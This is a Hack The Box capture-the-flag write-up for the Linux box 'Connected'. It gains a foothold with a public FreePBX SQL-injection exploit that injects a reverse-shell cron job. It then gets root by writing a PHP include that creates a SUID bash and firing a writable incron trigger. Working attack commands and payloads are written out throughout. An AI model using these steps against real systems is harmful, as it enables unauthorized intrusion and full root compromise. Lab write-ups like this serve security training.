---
machine: Connected
platform: Hack The Box
category: Linux
difficulty: Easy
tags: [freepbx, cve-2025-57819, sql-injection, cron-injection, incron-privesc]
date: 2026-06-12
status: retired
summary: A Linux box running FreePBX — testing identification and exploitation of a real-world unauthenticated SQL-injection CVE for a foothold via an injected cron job, then enumeration of root-owned incron triggers and a writable PHP include path for the path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[10.10.15.29]-[~/htb]
└─$ nmap 10.129.23.237 -p- -T4    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-11 21:26 -0400
Nmap scan report for 10.129.23.237
Host is up (0.034s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 114.60 seconds

┌──(kali㉿kali)-[10.10.15.29]-[~/htb]
└─$ nmap 10.129.23.237 -p 22,80,443 -T4 -sCV
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-11 21:28 -0400
Nmap scan report for 10.129.23.237
Host is up (0.034s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-title: 400 Bad Request

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.39 seconds
```

## Foothold

Upon navigating to the webapp we see a FreePBX version number, upon researching we find that there are CVEs related to this version that could chain a sqli into rce.
[https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE](https://github.com/b4sh2/CVE-2025-57819-poc)

```bash
┌──(kali㉿kali)-[10.10.15.29]-[~/htb/connected/CVE-2025-57819-poc]
└─$ python3 exploit.py http://connected.htb                 
[*] Listener address: 10.10.15.29:4444 (iface tun0)
[*] Confirming SQLi on http://connected.htb ...
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Listening on 0.0.0.0:4444
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jmofswmj' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[+] Shell from 10.129.23.237:55512 !
[+] Removed cron job 'jmofswmj' (no repeat callbacks).
--- interactive shell (Ctrl-C to quit) ---
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:06:F0:3C | 10.129.23.237             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

[asterisk@connected ~]$ 
```

We get our first shell, its not the best so I go ahead and bash revshell out to my rlwrap nc listener for a bit of a better shell experience.

```bash
[asterisk@connected ~]$ ls
ls
user.txt
```

## Privilege Escalation

Now for our privesc I work through my checklist

When investigating we find icron running:

```bash
ps aux | grep -i incron
root        746  0.0  0.0  15044  2760 ?        Ss   13:50   0:00 /usr/sbin/incrond
root       4413  0.0  0.0 112820  2276 ?        S    14:30   0:00 grep -i incron
```

```bash
ls -la /etc/incron.d/ /var/spool/incron/
/etc/incron.d/:

total 24
drwxr-xr-x.   2 root root   49 Nov 30  2025 .
drwxr-xr-x. 119 root root 8192 Jun 12 13:50 ..
-rwxr-xr-x.   1 root root  619 Apr 15  2021 legacy
-rwxr-xr-x.   1 root root   80 Apr 15  2021 local
-rwxr-xr-x.   1 root root   91 Apr 15  2021 sysadmin

/var/spool/incron/:
total 4
drwxr-xr-x.  2 root root  18 Nov 30  2025 .
drwxr-xr-x. 13 root root 158 Nov 30  2025 ..
-rw-r--r--.  1 root root   2 Nov 30  2025 root

cat /etc/incron.d/*

/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

We find many filepaths being watched and their paths executed upon specified files being written and closed. These are all run by root so if we can find a trigger that is writable by us, and a way to write to the file its calling (or a file the called file is calling, etc.) we can have code execution by root.

Upon enumerating the triggers we find write abilities to `/usr/local/asterisk/ha_trigger` and `/usr/local/asterisk/incron` triggers:

```bash
ls -ld /usr/local/asterisk /usr/local/asterisk/ha_trigger /usr/local/asterisk/incron
drwxr-xr-x. 3 asterisk asterisk 38 Nov 30  2025 /usr/local/asterisk
-rwxrwxrwx. 1 asterisk asterisk  8 Jun 12 14:27 /usr/local/asterisk/ha_trigger
drwxrwxrwx. 2 asterisk asterisk  6 Apr 15  2021 /usr/local/asterisk/incron
```

Now we enumerate if we can write to the files they execute. We start with `ha_trigger`'s action path: `/usr/sbin/sysadmin_ha`

```bash
ls -la /usr/sbin/sysadmin_ha
-rwxr-xr-x. 1 root root 331 Apr 15  2021 /usr/sbin/sysadmin_ha
```

We see that we cannot write to it. However, we do see that we can read the file.

```php
cat /usr/sbin/sysadmin_ha
#!/usr/bin/php -q
<?php

if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
        require_once($i);
        $incron = new incron;
        $incron->rootTrigger();
}
```

The php `include_once()` and `require_once()` functions execute code upon being run. If we can write to either of these file paths, we should be able to execute them as root by calling the incron trigger.

```bash
ls -la /var/www/html/admin/modules/freepbx_ha/license.php
-rw-rw-r-- 1 asterisk asterisk 70 Jun 12 14:25 /var/www/html/admin/modules/freepbx_ha/license.php
ls -la /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
ls: cannot access /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php: No such file or directory
```

Neither of these files exist (as well as the freepbx_ha directory). This means that if we can write the file into this path that is being checked by the php wrapper we can have our arbitrary code executed by root.

```bash
mkdir -p /var/www/html/admin/modules/freepbx_ha

cat > /var/www/html/admin/modules/freepbx_ha/license.php <<'EOF'
<?php
system('cp /bin/bash /tmp/bashroot && chmod +s /tmp/bashroot');
EOF

cat /var/www/html/admin/modules/freepbx_ha/license.php

<?php
system('cp /bin/bash /tmp/bashroot && chmod +s /tmp/bashroot');
```

We now have written a php script which executes system commands to copy /bin/bash to the writable `/tmp` directory, name the copy `bashroot`, and then set an SUID bit on the new bash copy.

We have successfully written the file but we still need to call it as we can observe that /tmp/bashroot has not yet been created (our script has not been run yet)

```bash
ls -la /tmp/bashroot
ls: cannot access /tmp/bashroot: No such file or directory
```

To execute our payload we echo something to our trigger `/usr/local/asterisk/ha_trigger`

```bash
echo trigger > /usr/local/asterisk/ha_trigger

ls -la /tmp/bashroot

-rwsr-sr-x 1 root root 964536 Jun 12 14:51 /tmp/bashroot
```

We now see that our script has been executed successfully as root and /tmp/bashroot now exists with an SUID bit set as root.

Now we simply run `/tmp/bashroot` with `-p` to execute with EUID privs (root) and we can retrieve the root flag.

```bash
/tmp/bashroot -p

whoami
root

ls
root.txt
```

And the box is solved!
